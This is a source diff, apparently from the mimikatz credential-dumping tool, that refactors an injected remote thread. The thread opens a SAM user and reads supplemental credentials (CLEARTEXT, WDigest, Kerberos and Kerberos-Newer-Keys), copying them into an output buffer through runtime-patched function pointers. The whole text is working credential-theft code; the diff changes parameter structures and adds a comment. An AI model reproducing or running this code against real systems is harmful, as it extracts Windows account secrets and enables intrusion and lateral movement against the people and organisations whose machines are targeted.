@@ -6,7 +6,7 @@
 #include "kuhl_m_lsadump_remote.h"
 
 #pragma optimize("", off)
-DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_FUNC lpParameter)
+DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
 {
 	SAMPR_HANDLE hSam, hDomain, hUser;
 	PPOLICY_ACCOUNT_DOMAIN_INFO pPolicyDomainInfo;
@@ -17,7 +17,7 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_FUNC lpParameter)
 		{0x004C0043, 0x00410045, 0x00540052, 0x00580045, 0x00000054}, // CLEARTEXT
 		{0x00440057, 0x00670069, 0x00730065, 0x00000074}, // WDigest
 		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x00000000}, // Kerberos
-		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x004e002d, 0x00770065, 0x00720065, 0x004b002d, 0x00790065,0x00000073}, //
+		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x004e002d, 0x00770065, 0x00720065, 0x004b002d, 0x00790065,0x00000073}, // Kerberos-Newer-Keys
 		};
 	UNICODE_STRING knu[] = {
 		{18, 18, (PWSTR) kn[0]},
@@ -32,7 +32,7 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_FUNC lpParameter)
 		{
 			if(NT_SUCCESS(((PSAMROPENDOMAIN) 0x4444444444444444)(hSam, 0x10000000, pPolicyDomainInfo->DomainSid, &hDomain)))
 			{
-				if(NT_SUCCESS(((PSAMROPENUSER) 0x4545454545454545)(hDomain, 0x10000000, *(PDWORD) lpParameter->inputData, &hUser)))
+				if(NT_SUCCESS(((PSAMROPENUSER) 0x4545454545454545)(hDomain, 0x10000000, lpParameter->input.inputDword, &hUser)))
 				{
 					for(i = 0; i < 5; i++)
 					{
@@ -52,11 +52,11 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_FUNC lpParameter)
 							credSize += buffers[i].credential.size;
 					}
 
-					lpParameter->outputSize = sizeof(LSA_SUPCREDENTIALS) + (5 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
-					if(lpParameter->outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
+					lpParameter->output.outputSize = sizeof(LSA_SUPCREDENTIALS) + (5 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
+					if(lpParameter->output.outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->output.outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
 					{
 						credSize = 0;
-						((PLSA_SUPCREDENTIALS) lpParameter->outputData)->count = 5;
+						((PLSA_SUPCREDENTIALS) lpParameter->output.outputData)->count = 5;
 						for(i = 0; i < 5; i++)
 						{
 							if(NT_SUCCESS(buffers[i].status))
@@ -64,8 +64,8 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_FUNC lpParameter)
 								if(buffers[i].Buffer && buffers[i].credential.size)
 								{
 									buffers[i].credential.offset = sizeof(LSA_SUPCREDENTIALS) + (5 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
-									((PLSA_SUPCREDENTIAL) ((PBYTE) lpParameter->outputData + sizeof(LSA_SUPCREDENTIALS)))[i] = buffers[i].credential;
-									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) lpParameter->outputData + buffers[i].credential.offset, buffers[i].Buffer, buffers[i].credential.size);
+									((PLSA_SUPCREDENTIAL) ((PBYTE) lpParameter->output.outputData + sizeof(LSA_SUPCREDENTIALS)))[i] = buffers[i].credential;
+									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) lpParameter->output.outputData + buffers[i].credential.offset, buffers[i].Buffer, buffers[i].credential.size);
 									credSize += buffers[i].credential.size;
 								}
 								if(i)
